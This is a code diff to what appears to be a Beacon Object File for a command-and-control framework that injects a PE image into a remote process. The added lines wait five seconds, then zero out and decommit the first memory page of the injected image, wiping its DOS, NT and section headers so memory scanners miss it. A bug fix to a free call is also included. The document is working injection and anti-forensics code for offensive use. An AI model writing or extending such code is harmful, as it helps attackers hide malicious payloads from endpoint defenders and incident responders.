@@ -10,7 +10,8 @@ void go( char* args, int argc )
                     Failed          = 1;
     void            *PProcessHandle = 0,
                     *RemoteMemory   = 0,
-                    *RemoteMemory2  = 0;
+                    *RemoteMemory2  = 0,
+                    *ZeroBuffer     = 0;
     size_t          AttrListSize    = 0,
                     RegionSize      = 0,
                     BytesWritten    = 0;
@@ -25,6 +26,8 @@ void go( char* args, int argc )
     PIMAGE_NT_HEADERS           NtHeaders       = 0;
     PIMAGE_SECTION_HEADER       Section         = 0;    
     CONTEXT                     Ctx             = { .ContextFlags = CONTEXT_INTEGER };
+    LARGE_INTEGER               Timer           = { .QuadPart = -5 * SECOND };
+    DWORD64                     OriginalBase    = 0;
 
     /* 
         Create parser and extract beacon arguments
@@ -270,12 +273,35 @@ void go( char* args, int argc )
         goto cleanup;
     }
 
+    /*
+        Cleanup dos/nt/section header in first page of memory
+        - Zero out first 4096 bytes
+        - Decommit first 4096 bytes
+    */
+    Ntdll$NtDelayExecution( FALSE, &Timer );
+    RegionSize = 0x1000;
+    ZeroBuffer = Msvcrt$calloc(RegionSize, 1); 
+    if ( ( Status = Ntdll$NtWriteVirtualMemory( 
+            Pi.hProcess,
+            RemoteMemory,
+            ZeroBuffer,
+            RegionSize,
+            &BytesWritten   
+    ) ) != 0x0 ) 
+    { 
+        NTERR( "NtWriteVirtualMemory", Status );
+        goto cleanup;
+    }
+    RegionSize = 0x1000;
+    Ntdll$NtFreeVirtualMemory( Pi.hProcess, &RemoteMemory, &RegionSize, MEM_DECOMMIT );
+    DBG("Wiped DOS/NT/Section headers from memory");
+
     Failed = 0;
 
 cleanup:
     if ( Failed && RemoteMemory) {
         RegionSize = 0;
-        Ntdll$NtFreeVirtualMemory( Pi.hProcess, RemoteMemory, &RegionSize, MEM_RELEASE );
+        Ntdll$NtFreeVirtualMemory( Pi.hProcess, &RemoteMemory, &RegionSize, MEM_RELEASE );
     }
 
     if ( PProcessHandle )   { Ntdll$NtClose( PProcessHandle ); }
